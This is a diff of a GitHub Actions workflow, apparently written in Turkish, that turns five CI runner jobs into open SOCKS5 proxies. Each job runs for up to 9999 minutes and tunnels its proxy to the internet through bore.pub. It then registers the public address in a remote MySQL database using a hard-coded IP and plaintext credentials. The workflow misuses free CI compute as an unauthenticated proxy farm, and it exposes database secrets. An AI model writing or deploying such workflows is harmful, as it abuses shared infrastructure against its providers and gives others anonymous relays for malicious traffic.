@@ -1,4 +1,4 @@
-name: 3-proxy-makinesi
+name: 20-proxy-makinesi
 on: workflow_dispatch
 
 jobs:
@@ -6,13 +6,12 @@ jobs:
     runs-on: windows-latest
     timeout-minutes: 9999
     steps:
-      - name: Python Proxy Kur
+      - name: Baslat
         run: |
-          pip install requests
+          pip install mysql-connector-python
           @'
-          import socket
-          import threading
-          import select
+          import socket, threading, select, subprocess, re
+          import mysql.connector
 
           def handle(client):
               try:
@@ -35,49 +34,50 @@ jobs:
                   client.send(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2,"big"))
                   while True:
                       r, _, _ = select.select([client, remote], [], [], 60)
-                      if not r:
-                          break
+                      if not r: break
                       for s in r:
                           d = s.recv(4096)
-                          if not d:
-                              return
+                          if not d: return
                           (remote if s is client else client).sendall(d)
-              except:
-                  pass
-              finally:
-                  client.close()
+              except: pass
+              finally: client.close()
 
           srv = socket.socket()
           srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
           srv.bind(("0.0.0.0", 1080))
           srv.listen(100)
-          print("PROXY HAZIR - port 1080", flush=True)
-          while True:
-              c, _ = srv.accept()
-              threading.Thread(target=handle, args=(c,), daemon=True).start()
-          '@ | Out-File -FilePath proxy.py -Encoding utf8
-          Start-Process python -ArgumentList "proxy.py" -WindowStyle Hidden
-          Start-Sleep 3
-          Write-Host "MAKINE 1 PROXY HAZIR" -ForegroundColor Green
+          threading.Thread(target=lambda: [threading.Thread(target=handle, args=(srv.accept()[0],), daemon=True).start() for _ in iter(int, 1)], daemon=True).start()
 
-      - name: Bore Tunnel Baslat
-        run: |
+          proc = subprocess.Popen(["bore.exe", "local", "1080", "--to", "bore.pub"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+          for line in proc.stdout:
+              print(line, end="", flush=True)
+              m = re.search(r"remote_port=(\d+)", line)
+              if m:
+                  adres = f"bore.pub:{m.group(1)}"
+                  conn = mysql.connector.connect(host="95.65.219.187", user="botuser", password="Bot123!", database="proxiler")
+                  cursor = conn.cursor()
+                  cursor.execute("DELETE FROM portlar WHERE makine=%s", ("makine1",))
+                  cursor.execute("INSERT INTO portlar (makine, adres) VALUES (%s, %s)", ("makine1", adres))
+                  conn.commit()
+                  conn.close()
+                  print(f"KAYDEDILDI: {adres}", flush=True)
+                  break
+          proc.wait()
+          '@ | Out-File -FilePath run.py -Encoding utf8
           Invoke-WebRequest -Uri "https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-pc-windows-msvc.zip" -OutFile "bore.zip"
-          Expand-Archive bore.zip -DestinationPath bore
-          Write-Host "MAKINE 1 - PROXY ADRESI asagida gorunecek:" -ForegroundColor Green
-          .\bore\bore.exe local 1080 --to bore.pub
+          Expand-Archive bore.zip -DestinationPath .
+          python run.py
 
   makine2:
     runs-on: windows-latest
     timeout-minutes: 9999
     steps:
-      - name: Python Proxy Kur
+      - name: Baslat
         run: |
-          pip install requests
+          pip install mysql-connector-python
           @'
-          import socket
-          import threading
-          import select
+          import socket, threading, select, subprocess, re
+          import mysql.connector
 
           def handle(client):
               try:
@@ -100,49 +100,50 @@ jobs:
                   client.send(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2,"big"))
                   while True:
                       r, _, _ = select.select([client, remote], [], [], 60)
-                      if not r:
-                          break
+                      if not r: break
                       for s in r:
                           d = s.recv(4096)
-                          if not d:
-                              return
+                          if not d: return
                           (remote if s is client else client).sendall(d)
-              except:
-                  pass
-              finally:
-                  client.close()
+              except: pass
+              finally: client.close()
 
           srv = socket.socket()
           srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
           srv.bind(("0.0.0.0", 1080))
           srv.listen(100)
-          print("PROXY HAZIR - port 1080", flush=True)
-          while True:
-              c, _ = srv.accept()
-              threading.Thread(target=handle, args=(c,), daemon=True).start()
-          '@ | Out-File -FilePath proxy.py -Encoding utf8
-          Start-Process python -ArgumentList "proxy.py" -WindowStyle Hidden
-          Start-Sleep 3
-          Write-Host "MAKINE 2 PROXY HAZIR" -ForegroundColor Green
+          threading.Thread(target=lambda: [threading.Thread(target=handle, args=(srv.accept()[0],), daemon=True).start() for _ in iter(int, 1)], daemon=True).start()
 
-      - name: Bore Tunnel Baslat
-        run: |
+          proc = subprocess.Popen(["bore.exe", "local", "1080", "--to", "bore.pub"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+          for line in proc.stdout:
+              print(line, end="", flush=True)
+              m = re.search(r"remote_port=(\d+)", line)
+              if m:
+                  adres = f"bore.pub:{m.group(1)}"
+                  conn = mysql.connector.connect(host="95.65.219.187", user="botuser", password="Bot123!", database="proxiler")
+                  cursor = conn.cursor()
+                  cursor.execute("DELETE FROM portlar WHERE makine=%s", ("makine2",))
+                  cursor.execute("INSERT INTO portlar (makine, adres) VALUES (%s, %s)", ("makine2", adres))
+                  conn.commit()
+                  conn.close()
+                  print(f"KAYDEDILDI: {adres}", flush=True)
+                  break
+          proc.wait()
+          '@ | Out-File -FilePath run.py -Encoding utf8
           Invoke-WebRequest -Uri "https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-pc-windows-msvc.zip" -OutFile "bore.zip"
-          Expand-Archive bore.zip -DestinationPath bore
-          Write-Host "MAKINE 2 - PROXY ADRESI asagida gorunecek:" -ForegroundColor Green
-          .\bore\bore.exe local 1080 --to bore.pub
+          Expand-Archive bore.zip -DestinationPath .
+          python run.py
 
   makine3:
     runs-on: windows-latest
     timeout-minutes: 9999
     steps:
-      - name: Python Proxy Kur
+      - name: Baslat
         run: |
-          pip install requests
+          pip install mysql-connector-python
           @'
-          import socket
-          import threading
-          import select
+          import socket, threading, select, subprocess, re
+          import mysql.connector
 
           def handle(client):
               try:
@@ -165,34 +166,168 @@ jobs:
                   client.send(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2,"big"))
                   while True:
                       r, _, _ = select.select([client, remote], [], [], 60)
-                      if not r:
-                          break
+                      if not r: break
                       for s in r:
                           d = s.recv(4096)
-                          if not d:
-                              return
+                          if not d: return
                           (remote if s is client else client).sendall(d)
-              except:
-                  pass
-              finally:
-                  client.close()
+              except: pass
+              finally: client.close()
 
           srv = socket.socket()
           srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
           srv.bind(("0.0.0.0", 1080))
           srv.listen(100)
-          print("PROXY HAZIR - port 1080", flush=True)
-          while True:
-              c, _ = srv.accept()
-              threading.Thread(target=handle, args=(c,), daemon=True).start()
-          '@ | Out-File -FilePath proxy.py -Encoding utf8
-          Start-Process python -ArgumentList "proxy.py" -WindowStyle Hidden
-          Start-Sleep 3
-          Write-Host "MAKINE 3 PROXY HAZIR" -ForegroundColor Green
+          threading.Thread(target=lambda: [threading.Thread(target=handle, args=(srv.accept()[0],), daemon=True).start() for _ in iter(int, 1)], daemon=True).start()
 
-      - name: Bore Tunnel Baslat
-        run: |
+          proc = subprocess.Popen(["bore.exe", "local", "1080", "--to", "bore.pub"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+          for line in proc.stdout:
+              print(line, end="", flush=True)
+              m = re.search(r"remote_port=(\d+)", line)
+              if m:
+                  adres = f"bore.pub:{m.group(1)}"
+                  conn = mysql.connector.connect(host="95.65.219.187", user="botuser", password="Bot123!", database="proxiler")
+                  cursor = conn.cursor()
+                  cursor.execute("DELETE FROM portlar WHERE makine=%s", ("makine3",))
+                  cursor.execute("INSERT INTO portlar (makine, adres) VALUES (%s, %s)", ("makine3", adres))
+                  conn.commit()
+                  conn.close()
+                  print(f"KAYDEDILDI: {adres}", flush=True)
+                  break
+          proc.wait()
+          '@ | Out-File -FilePath run.py -Encoding utf8
           Invoke-WebRequest -Uri "https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-pc-windows-msvc.zip" -OutFile "bore.zip"
-          Expand-Archive bore.zip -DestinationPath bore
-          Write-Host "MAKINE 3 - PROXY ADRESI asagida gorunecek:" -ForegroundColor Green
-          .\bore\bore.exe local 1080 --to bore.pub
+          Expand-Archive bore.zip -DestinationPath .
+          python run.py
+
+  makine4:
+    runs-on: windows-latest
+    timeout-minutes: 9999
+    steps:
+      - name: Baslat
+        run: |
+          pip install mysql-connector-python
+          @'
+          import socket, threading, select, subprocess, re
+          import mysql.connector
+
+          def handle(client):
+              try:
+                  data = client.recv(256)
+                  client.send(b"\x05\x00")
+                  data = client.recv(256)
+                  addr_type = data[3]
+                  if addr_type == 1:
+                      addr = socket.inet_ntoa(data[4:8])
+                      port = int.from_bytes(data[8:10], "big")
+                  elif addr_type == 3:
+                      ln = data[4]
+                      addr = data[5:5+ln].decode()
+                      port = int.from_bytes(data[5+ln:7+ln], "big")
+                  else:
+                      client.close()
+                      return
+                  remote = socket.socket()
+                  remote.connect((addr, port))
+                  client.send(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2,"big"))
+                  while True:
+                      r, _, _ = select.select([client, remote], [], [], 60)
+                      if not r: break
+                      for s in r:
+                          d = s.recv(4096)
+                          if not d: return
+                          (remote if s is client else client).sendall(d)
+              except: pass
+              finally: client.close()
+
+          srv = socket.socket()
+          srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+          srv.bind(("0.0.0.0", 1080))
+          srv.listen(100)
+          threading.Thread(target=lambda: [threading.Thread(target=handle, args=(srv.accept()[0],), daemon=True).start() for _ in iter(int, 1)], daemon=True).start()
+
+          proc = subprocess.Popen(["bore.exe", "local", "1080", "--to", "bore.pub"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+          for line in proc.stdout:
+              print(line, end="", flush=True)
+              m = re.search(r"remote_port=(\d+)", line)
+              if m:
+                  adres = f"bore.pub:{m.group(1)}"
+                  conn = mysql.connector.connect(host="95.65.219.187", user="botuser", password="Bot123!", database="proxiler")
+                  cursor = conn.cursor()
+                  cursor.execute("DELETE FROM portlar WHERE makine=%s", ("makine4",))
+                  cursor.execute("INSERT INTO portlar (makine, adres) VALUES (%s, %s)", ("makine4", adres))
+                  conn.commit()
+                  conn.close()
+                  print(f"KAYDEDILDI: {adres}", flush=True)
+                  break
+          proc.wait()
+          '@ | Out-File -FilePath run.py -Encoding utf8
+          Invoke-WebRequest -Uri "https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-pc-windows-msvc.zip" -OutFile "bore.zip"
+          Expand-Archive bore.zip -DestinationPath .
+          python run.py
+
+  makine5:
+    runs-on: windows-latest
+    timeout-minutes: 9999
+    steps:
+      - name: Baslat
+        run: |
+          pip install mysql-connector-python
+          @'
+          import socket, threading, select, subprocess, re
+          import mysql.connector
+
+          def handle(client):
+              try:
+                  data = client.recv(256)
+                  client.send(b"\x05\x00")
+                  data = client.recv(256)
+                  addr_type = data[3]
+                  if addr_type == 1:
+                      addr = socket.inet_ntoa(data[4:8])
+                      port = int.from_bytes(data[8:10], "big")
+                  elif addr_type == 3:
+                      ln = data[4]
+                      addr = data[5:5+ln].decode()
+                      port = int.from_bytes(data[5+ln:7+ln], "big")
+                  else:
+                      client.close()
+                      return
+                  remote = socket.socket()
+                  remote.connect((addr, port))
+                  client.send(b"\x05\x00\x00\x01" + socket.inet_aton("0.0.0.0") + (0).to_bytes(2,"big"))
+                  while True:
+                      r, _, _ = select.select([client, remote], [], [], 60)
+                      if not r: break
+                      for s in r:
+                          d = s.recv(4096)
+                          if not d: return
+                          (remote if s is client else client).sendall(d)
+              except: pass
+              finally: client.close()
+
+          srv = socket.socket()
+          srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+          srv.bind(("0.0.0.0", 1080))
+          srv.listen(100)
+          threading.Thread(target=lambda: [threading.Thread(target=handle, args=(srv.accept()[0],), daemon=True).start() for _ in iter(int, 1)], daemon=True).start()
+
+          proc = subprocess.Popen(["bore.exe", "local", "1080", "--to", "bore.pub"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+          for line in proc.stdout:
+              print(line, end="", flush=True)
+              m = re.search(r"remote_port=(\d+)", line)
+              if m:
+                  adres = f"bore.pub:{m.group(1)}"
+                  conn = mysql.connector.connect(host="95.65.219.187", user="botuser", password="Bot123!", database="proxiler")
+                  cursor = conn.cursor()
+                  cursor.execute("DELETE FROM portlar WHERE makine=%s", ("makine5",))
+                  cursor.execute("INSERT INTO portlar (makine, adres) VALUES (%s, %s)", ("makine5", adres))
+                  conn.commit()
+                  conn.close()
+                  print(f"KAYDEDILDI: {adres}", flush=True)
+                  break
+          proc.wait()
+          '@ | Out-File -FilePath run.py -Encoding utf8
+          Invoke-WebRequest -Uri "https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-pc-windows-msvc.zip" -OutFile "bore.zip"
+          Expand-Archive bore.zip -DestinationPath .
+          python run.py
